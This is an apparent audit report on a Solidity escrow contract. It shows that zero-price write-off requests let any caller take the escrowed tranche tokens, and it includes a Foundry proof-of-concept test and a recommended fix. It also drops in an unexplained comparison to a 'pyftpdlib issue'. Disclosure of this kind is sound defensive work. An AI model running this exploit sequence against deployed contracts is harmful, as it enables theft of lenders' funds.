### Title
Zero-price write-off requests let any fulfiller seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` validates only the escrowed tranche amount and accepts `underlyingsRequested == 0`, while `fullfillWriteOffRequest` permits any caller to complete that request with `_underlyings == 0` and receive all escrowed tranche tokens without paying the lender. [1](#0-0) [2](#0-1) 

### Finding Description
During a running epoch, a tranche-token holder can escrow `amount > 0` tranche tokens with `underlyingsRequested == 0` because only `amount` is checked for zero. [1](#0-0) 

The resulting request is stored with a nonzero `tranches` value and a zero `underlyings` value. [3](#0-2) 

Any unprivileged fulfiller can then pass that exact tranche amount and zero underlyings: the request check succeeds, `safeTransferFrom(..., 0)` transfers no payment, the zero exit fee and lender payout transfer nothing, and the final tranche transfer sends the escrowed tokens to the attacker. [2](#0-1) 

This is analogous to the pyftpdlib issue because a command is accepted in an invalid semantic state: the escrow accepts an economically invalid zero-price sell order and the fulfillment path executes it instead of rejecting it.

### Impact Explanation
An attacker obtains the full escrowed tranche position without supplying underlying. For example, an escrow of `10_000e18` AA tranche tokens yields the fulfiller `10_000e18` tranche tokens and costs them `0` USDC. [4](#0-3) 

The lender’s loss equals the claim value represented by the seized tranche tokens; the escrow’s `nonReentrant`, epoch-running, request-existence, and request-match checks do not prevent the zero-price fulfillment. [5](#0-4) [6](#0-5) 

### Likelihood Explanation
Exploitation requires a lender to create a malformed request with `underlyingsRequested == 0`; the contract itself provides no guard against this input. [1](#0-0) 

Once such a request exists, fulfillment is permissionless and requires neither underlying balance, approval, borrower status, nor KYC. [7](#0-6) 

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`, alongside the existing `amount == 0` check.

As defense in depth, also require `currentRequest.underlyings != 0` in `fullfillWriteOffRequest` before deleting and settling the request. This preserves intentional sales while preventing zero-price escrow orders from being executable by arbitrary fulfillers.

### Proof of Concept
The following test can be added to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`; it uses the existing mainnet-fork setup where the epoch is running and the seller is `LP`.

```solidity
function testZeroUnderlyingRequestCanBeFulfilledForFree() external {
    uint256 requestedTranches = 10000e18;
    address attacker = makeAddr("attacker");

    // A lender creates an economically invalid request asking for zero USDC.
    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    (uint256 requestTranches, uint256 requestUnderlyings) =
        escrow.userRequests(LP);
    assertEq(requestTranches, requestedTranches);
    assertEq(requestUnderlyings, 0);

    uint256 attackerTrancheBefore = tranche.balanceOf(attacker);
    uint256 lpTrancheBefore = tranche.balanceOf(LP);
    uint256 lpUnderlyingBefore = underlying.balanceOf(LP);

    // Any EOA fulfills the request with no underlying balance or approval.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    (requestTranches, requestUnderlyings) = escrow.userRequests(LP);
    assertEq(requestTranches, 0);
    assertEq(requestUnderlyings, 0);
    assertEq(escrow.pendingUnderlyings(), 0);

    // The attacker receives all escrowed tranches for zero payment.
    assertEq(
        tranche.balanceOf(attacker) - attackerTrancheBefore,
        requestedTranches
    );
    assertEq(tranche.balanceOf(LP), lpTrancheBefore);
    assertEq(underlying.balanceOf(LP), lpUnderlyingBefore);
    assertEq(underlying.balanceOf(attacker), 0);
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L122-151)
```text
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
